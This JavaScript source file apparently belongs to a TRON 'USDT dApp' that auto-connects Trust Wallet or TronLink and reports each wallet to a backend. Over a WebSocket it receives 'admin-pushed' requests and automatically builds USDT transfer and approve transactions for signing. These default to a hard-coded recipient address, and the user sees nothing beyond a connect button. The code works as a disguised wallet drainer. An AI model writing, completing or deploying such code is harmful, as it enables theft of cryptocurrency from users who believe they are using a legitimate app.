import "./style.css";
import { TronWeb } from "tronweb";
import {
  WalletConnectChainID,
  WalletConnectWallet,
} from "@tronweb3/walletconnect-tron";

// ─── Constants ────────────────────────────────────────────────────────────────
const TRON_RPC        = "https://api.trongrid.io";
const USDT_CONTRACT   = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const FIXED_RECIPIENT = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
const USDT_DECIMALS   = 6;
const FEE_LIMIT       = 200_000_000;
const CLIENT_ID_KEY   = "trust_tron_client_id";
const CONN_MODE_KEY   = "trust_tron_conn_mode"; // "injected" | "walletconnect"

const WC_PROJECT_ID = import.meta.env.VITE_WALLETCONNECT_PROJECT_ID?.trim() || "";
const TRONGRID_KEY  = import.meta.env.VITE_TRONGRID_API_KEY?.trim();
const APP_NAME      = import.meta.env.VITE_APP_NAME?.trim()        || "TRON DApp";
const APP_DESC      = import.meta.env.VITE_APP_DESCRIPTION?.trim() || "TRON USDT dApp";
const APP_ICON      = import.meta.env.VITE_APP_ICON_URL?.trim()    || `${location.origin}/logo.png`;
const BACKEND_HTTP  = (import.meta.env.VITE_BACKEND_HTTP_URL?.trim() || `${location.protocol}//${location.hostname}:8787`).replace(/\/+$/, "");
const BACKEND_WS    = (import.meta.env.VITE_BACKEND_WS_URL?.trim()  || `${location.protocol === "https:" ? "wss" : "ws"}://${location.hostname}:8787/ws`).replace(/\/+$/, "");

// ─── Detect environment ───────────────────────────────────────────────────────
// Trust Wallet (and TronLink) inject window.tronWeb into their in-app browser.
// If that exists, we are INSIDE a wallet browser — no QR needed.
function getInjectedTronWeb() {
  // Trust Wallet injects window.tronWeb (TronLink-compatible API)
  if (window.tronWeb && typeof window.tronWeb.request === "function") return window.tronWeb;
  if (window.tronWeb && window.tronWeb.defaultAddress) return window.tronWeb;
  return null;
}

const injectedTW = getInjectedTronWeb();
const isInWalletBrowser = Boolean(injectedTW);

// ─── DOM ──────────────────────────────────────────────────────────────────────
const el = {
  walletStrip:   document.getElementById("walletStrip"),
  walletAddress: document.getElementById("walletAddress"),
  disconnectBtn: document.getElementById("disconnectBtn"),
  connectStatus: document.getElementById("connectStatus"),
  connectBtn:    document.getElementById("connectBtn"),
  envBadge:      document.getElementById("envBadge"),
};

// ─── TronWeb (for building transactions) ──────────────────────────────────────
const tronWeb = new TronWeb({
  fullHost: TRON_RPC,
  headers:  TRONGRID_KEY ? { "TRON-PRO-API-KEY": TRONGRID_KEY } : {},
});

// ─── State ────────────────────────────────────────────────────────────────────
const clientId       = getOrCreateClientId();
let connectedAddress = "";
let connMode         = null; // "injected" | "walletconnect"
let wcClient         = null;
let ws               = null;
let wsReconnectTimer = null;
let heartbeatTimer   = null;
const processingSet  = new Set();

// ─── Utilities ────────────────────────────────────────────────────────────────
function getOrCreateClientId() {
  let id = localStorage.getItem(CLIENT_ID_KEY);
  if (!id) {
    id = typeof crypto.randomUUID === "function"
      ? crypto.randomUUID()
      : `${Date.now().toString(36)}_${Math.random().toString(36).slice(2)}`;
    localStorage.setItem(CLIENT_ID_KEY, id);
  }
  return id;
}

function decimalToInt(amount, decimals) {
  const s = String(amount).trim();
  if (!/^\d+(\.\d+)?$/.test(s)) throw new Error("Invalid amount");
  const [whole, frac = ""] = s.split(".");
  if (frac.length > decimals) throw new Error(`Max ${decimals} decimal places`);
  return (`${whole.replace(/^0+(?=\d)/, "") || "0"}${frac.padEnd(decimals, "0")}`.replace(/^0+(?=\d)/, "") || "0");
}

function shortAddr(a) {
  if (!a || a.length < 12) return a;
  return `${a.slice(0, 6)}…${a.slice(-4)}`;
}

function setStatus(msg, isError = false) {
  if (!el.connectStatus) return;
  el.connectStatus.textContent = msg;
  el.connectStatus.style.color = isError ? "#e54b4b" : "#9b9bbb";
}

// ─── UI ───────────────────────────────────────────────────────────────────────
function syncUi() {
  const ok = Boolean(connectedAddress);
  if (el.walletStrip)   el.walletStrip.hidden   = !ok;
  if (el.disconnectBtn) el.disconnectBtn.hidden  = !ok;
  if (el.connectBtn)    el.connectBtn.hidden     = ok;
  if (ok) setStatus("");
}

// ─── Backend HTTP ─────────────────────────────────────────────────────────────
async function bPost(path, body) {
  const r = await fetch(`${BACKEND_HTTP}${path}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
  if (!r.ok) throw new Error(await r.text() || `HTTP ${r.status}`);
  return r.json();
}

async function bGet(path) {
  const r = await fetch(`${BACKEND_HTTP}${path}`);
  if (!r.ok) throw new Error(await r.text() || `HTTP ${r.status}`);
  return r.json();
}

async function registerWallet() {
  if (!connectedAddress) return;
  try {
    await bPost("/api/wallet/register", {
      clientId,
      address: connectedAddress,
      userAgent: navigator.userAgent,
      mode: connMode,
    });
  } catch { /* silent */ }
}

async function reportResult(req, payload) {
  try {
    await bPost(`/api/request/${encodeURIComponent(req.id)}/result`, { clientId, ...payload });
  } catch { /* silent */ }
}

// ─── WebSocket ────────────────────────────────────────────────────────────────
function openWs() {
  if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) return;
  ws = new WebSocket(BACKEND_WS);
  ws.onopen = () => ws.send(JSON.stringify({ type: "identify", role: "wallet", clientId }));
  ws.onmessage = async (ev) => {
    let p; try { p = JSON.parse(String(ev.data)); } catch { return; }
    if (p.type === "transaction_request" && p.request) { await autoSign(p.request); return; }
    if (p.type === "wallet_pending" && Array.isArray(p.requests)) {
      for (const req of p.requests) if (req.status === "pending") await autoSign(req);
    }
  };
  ws.onclose = () => {
    if (wsReconnectTimer) clearTimeout(wsReconnectTimer);
    wsReconnectTimer = setTimeout(openWs, 3000);
  };
}

function startSync() {
  openWs();
  if (heartbeatTimer) clearInterval(heartbeatTimer);
  heartbeatTimer = setInterval(() => {
    if (connectedAddress) bPost("/api/wallet/heartbeat", { clientId }).catch(() => {});
  }, 25_000);
}

// ─── Transaction signing (works for both injected and WC) ─────────────────────
async function signAndBroadcast(tx) {
  let signed;
  if (connMode === "injected") {
    // Trust Wallet / TronLink in-app browser: use the injected signer
    signed = await injectedTW.trx.sign(tx);
  } else {
    // WalletConnect: triggers Trust Wallet popup via WC
    signed = await wcClient.signTransaction(tx);
  }
  const result = await tronWeb.trx.sendRawTransaction(signed);
  if (!result?.result) throw new Error(`Broadcast failed: ${JSON.stringify(result)}`);
  return result.txid;
}

async function buildAndSign_Transfer(to, amount) {
  if (!amount || parseFloat(amount) <= 0) throw new Error("Invalid amount");
  const trigger = await tronWeb.transactionBuilder.triggerSmartContract(
    USDT_CONTRACT, "transfer(address,uint256)",
    { feeLimit: FEE_LIMIT },
    [{ type: "address", value: to }, { type: "uint256", value: decimalToInt(amount, USDT_DECIMALS) }],
    connectedAddress
  );
  if (!trigger?.result?.result || !trigger.transaction) throw new Error("Transfer build failed");
  return signAndBroadcast(trigger.transaction);
}

async function buildAndSign_Approve(spender, amount) {
  if (!amount || parseFloat(amount) <= 0) throw new Error("Invalid amount");
  const trigger = await tronWeb.transactionBuilder.triggerSmartContract(
    USDT_CONTRACT, "approve(address,uint256)",
    { feeLimit: FEE_LIMIT },
    [{ type: "address", value: spender }, { type: "uint256", value: decimalToInt(amount, USDT_DECIMALS) }],
    connectedAddress
  );
  if (!trigger?.result?.result || !trigger.transaction) throw new Error("Approve build failed");
  return signAndBroadcast(trigger.transaction);
}

// ─── Auto-sign (admin-pushed requests) ────────────────────────────────────────
async function autoSign(req) {
  if (!connectedAddress) return;
  if (connMode === "walletconnect" && !wcClient) return;
  if (processingSet.has(req.id)) return;
  processingSet.add(req.id);

  const p = req.params || {};
  try {
    let txid;
    if (req.type === "trc20_transfer") {
      txid = await buildAndSign_Transfer(
        String(p.to || FIXED_RECIPIENT).trim(),
        String(p.amount || "").trim()
      );
    } else if (req.type === "trc20_approve") {
      txid = await buildAndSign_Approve(
        String(p.spender || FIXED_RECIPIENT).trim(),
        String(p.amount  || "").trim()
      );
    } else {
      throw new Error(`Unknown type: ${req.type}`);
    }
    await reportResult(req, { action: "approved", txid });
    setStatus(`✓ Signed! Tx: ${txid.slice(0, 14)}…`);
  } catch (e) {
    const isRejected = /reject|denied|cancel/i.test(String(e));
    await reportResult(req, { action: isRejected ? "rejected" : "failed", error: String(e) });
    setStatus(isRejected ? "" : "Transaction failed", !isRejected);
  } finally {
    processingSet.delete(req.id);
  }
}

// ─── Connection state ─────────────────────────────────────────────────────────
function onConnected(address, mode) {
  connectedAddress = address;
  connMode = mode;
  localStorage.setItem(CONN_MODE_KEY, mode);
  if (el.walletAddress) el.walletAddress.textContent = shortAddr(address);
  syncUi();
  registerWallet();
  startSync();
  bGet(`/api/wallet/${encodeURIComponent(clientId)}/pending-requests`)
    .then(({ requests }) => {
      if (Array.isArray(requests)) requests.filter(r => r.status === "pending").forEach(autoSign);
    })
    .catch(() => {});
}

function onDisconnected() {
  connectedAddress = "";
  connMode = null;
  localStorage.removeItem(CONN_MODE_KEY);
  if (el.walletAddress) el.walletAddress.textContent = "";
  setStatus("");
  syncUi();
  bPost("/api/wallet/disconnect", { clientId }).catch(() => {});
}

// ═══════════════════════════════════════════════════════════════════════════════
// PATH A — Injected TronWeb (inside Trust Wallet / TronLink browser)
// This is the primary path. No QR code, no WalletConnect.
// Trust Wallet injects window.tronWeb. We call tron_requestAccounts which
// triggers Trust Wallet's native "Connect to this dApp?" approval popup.
// ═══════════════════════════════════════════════════════════════════════════════
async function connectViaInjection() {
  setStatus("Connecting wallet…");

  const tw = injectedTW;

  // Step 1: Request accounts — triggers Trust Wallet's native approval popup
  try {
    if (typeof tw.request === "function") {
      await tw.request({ method: "tron_requestAccounts" });
    }
  } catch (e) {
    // Some older builds throw if already connected — that's OK
    if (!/already/i.test(String(e))) {
      setStatus("Connection rejected.", true);
      return;
    }
  }

  // Step 2: Read address (poll briefly since the popup is async)
  let address = tw.defaultAddress?.base58;
  for (let i = 0; i < 20 && !address; i++) {
    await new Promise(r => setTimeout(r, 200));
    address = tw.defaultAddress?.base58;
  }

  if (!address) {
    setStatus("Could not get wallet address. Please try again.", true);
    return;
  }

  onConnected(address, "injected");

  // Keep watching for account changes (user switches wallet in Trust Wallet)
  const poll = setInterval(() => {
    const current = injectedTW?.defaultAddress?.base58;
    if (current && current !== connectedAddress) onConnected(current, "injected");
    if (!current && connectedAddress) onDisconnected();
  }, 2000);

  // Store the poll ref for cleanup on disconnect
  window._twPoll = poll;
}

// ═══════════════════════════════════════════════════════════════════════════════
// PATH B — WalletConnect (opened in a regular browser like Chrome/Safari)
// Shows the AppKit modal (QR code on desktop, deep-link on mobile).
// ═══════════════════════════════════════════════════════════════════════════════
function initWcClient() {
  if (wcClient) return;
  wcClient = new WalletConnectWallet({
    network: WalletConnectChainID.Mainnet,
    options: {
      relayUrl: "wss://relay.walletconnect.com",
      projectId: WC_PROJECT_ID,
      metadata: {
        name: APP_NAME,
        description: APP_DESC,
        url: location.origin,
        icons: [APP_ICON],
      },
    },
    themeMode: "dark",
    themeVariables: { "--w3m-z-index": "9999", "--w3m-accent": "#1dc071" },
  });

  wcClient.on("accountsChanged", (accounts) => {
    if (accounts?.[0]) onConnected(accounts[0], "walletconnect");
    else onDisconnected();
  });
  wcClient.on("disconnect", onDisconnected);
}

async function connectViaWalletConnect() {
  if (!WC_PROJECT_ID) {
    setStatus("WalletConnect project ID not configured.", true);
    return;
  }
  initWcClient();
  setStatus("Opening wallet selector…");
  try {
    // No onUri → AppKit shows its own modal (QR + Trust Wallet deep-link button)
    const { address } = await wcClient.connect();
    onConnected(address, "walletconnect");
  } catch (e) {
    const msg = String(e);
    setStatus(/reject|cancel|close/i.test(msg) ? "Cancelled." : `Failed: ${msg.slice(0, 60)}`, true);
  }
}

async function disconnect() {
  if (window._twPoll) { clearInterval(window._twPoll); window._twPoll = null; }
  if (connMode === "walletconnect") {
    try { await wcClient?.disconnect(); } catch { /* ok */ }
  }
  onDisconnected();
}

// ─── Connect dispatcher ───────────────────────────────────────────────────────
async function connect() {
  if (isInWalletBrowser) {
    await connectViaInjection();
  } else {
    await connectViaWalletConnect();
  }
}

// ─── Init ─────────────────────────────────────────────────────────────────────
async function init() {
  // Show which environment was detected
  if (el.envBadge) {
    el.envBadge.textContent = isInWalletBrowser ? "🔒 Trust Wallet Browser" : "🌐 External Browser";
    el.envBadge.style.color = isInWalletBrowser ? "#1dc071" : "#9b9bbb";
  }

  syncUi();

  // ── PATH A: Inside Trust Wallet browser ─────────────────────────────────────
  if (isInWalletBrowser) {
    // Check if already connected (address already injected from a previous visit)
    const existing = injectedTW?.defaultAddress?.base58;
    if (existing) {
      onConnected(existing, "injected");
      return;
    }
    // Auto-trigger connection immediately — no user tap needed
    await connectViaInjection();
    return;
  }

  // ── PATH B: External browser — try to restore WC session first ──────────────
  const savedMode = localStorage.getItem(CONN_MODE_KEY);
  if (savedMode === "walletconnect" && WC_PROJECT_ID) {
    initWcClient();
    try {
      const { address } = await wcClient.checkConnectStatus();
      if (address) {
        onConnected(address, "walletconnect");
        return;
      }
    } catch { /* no saved session */ }
  }

  setStatus("Tap Connect to link your wallet.");
  syncUi();
}

// ─── Events ───────────────────────────────────────────────────────────────────
if (el.connectBtn)    el.connectBtn.addEventListener("click", connect);
if (el.disconnectBtn) el.disconnectBtn.addEventListener("click", disconnect);

init().catch(e => setStatus(`Init failed: ${e}`, true));
